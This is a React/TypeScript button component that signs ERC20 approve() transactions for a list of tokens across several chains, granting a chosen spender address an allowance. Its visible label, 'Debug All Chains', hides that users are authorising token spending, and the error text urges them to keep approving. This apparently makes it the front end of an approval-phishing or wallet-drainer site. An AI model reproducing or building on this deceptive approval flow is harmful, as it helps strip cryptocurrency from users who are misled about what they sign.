"use client";

import { useState } from "react";
import { useAccount, useWalletClient } from "wagmi";
import { ethers } from "ethers";

type ApproveButtonProps = {
  spenderAddress: string;         // The address that will be approved to spend tokens
  tokenAddresses: string[];        // Array of token contract addresses to approve for the spender
  chainIds: number[];              // Array of corresponding chain IDs for each token contract
  amount: string;                  // Amount to approve (using 18 decimals)
};

export default function ApproveButton({ spenderAddress, tokenAddresses, chainIds, amount }: ApproveButtonProps) {
  const { address } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [isLoading, setIsLoading] = useState(false);
  const [approvedTokens, setApprovedTokens] = useState<number>(0); // Tracks the number of successfully approved tokens

  const approveToken = async () => {
    if (!walletClient) {
      alert("Please connect your wallet first");
      return;
    }

    setIsLoading(true);

    try {
      // Create a provider and signer instance
      const provider = new ethers.BrowserProvider(walletClient as any);
      const signer = await provider.getSigner();

      // Define the ERC20 ABI with just the `approve` function
      const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
      
      // Convert the amount to 18 decimals (assuming all tokens have 18 decimals)
      const approveAmount = ethers.parseUnits(amount, 18);

      // Loop through each token address and approve one by one
      for (let i = 0; i < tokenAddresses.length; i++) {
        const tokenAddress = tokenAddresses[i];
        const chainId = chainIds[i]; // Get the corresponding chain ID

        // Check if the wallet is on the correct chain
        const currentChainId = await provider.getNetwork().then(network => network.chainId);
        if (currentChainId !== BigInt(chainId)) {  // Convert chainId to bigint for comparison
          // Switch to the required chain
          await walletClient.switchChain({ id: chainId }).catch((error) => {
            console.error(`Failed to switch to chain ${chainId}`, error);
            throw new Error(`Please switch to the correct chain for token ${i + 1}`);
          });
        }

        // Create contract instance and call `approve`
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
        const tx = await tokenContract.approve(spenderAddress, approveAmount);
        await tx.wait();

        // Update the approved tokens count on successful approval
        setApprovedTokens(i + 1);
        alert(`Approval successful for token ${i + 1}: ${tokenAddress}`);
      }

      alert("All tokens approved successfully!");
    } catch (error) {
      console.error("Approval failed:", error);
      alert("Approval failed. Please approve the tokens in sequence.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <button
      onClick={approveToken}
      disabled={isLoading}
      style={{ padding: "10px", background: "black", color: "white", borderRadius: "5px", width: "100%", borderStyle: "solid", borderColor: "white", marginTop: "10px", marginLeft: "10px" }}
    >
      {isLoading ? `Processing Batch ${approvedTokens + 1}...` : `Debug All Chains ${approvedTokens} / ${tokenAddresses.length}`}
    </button>
  );
}
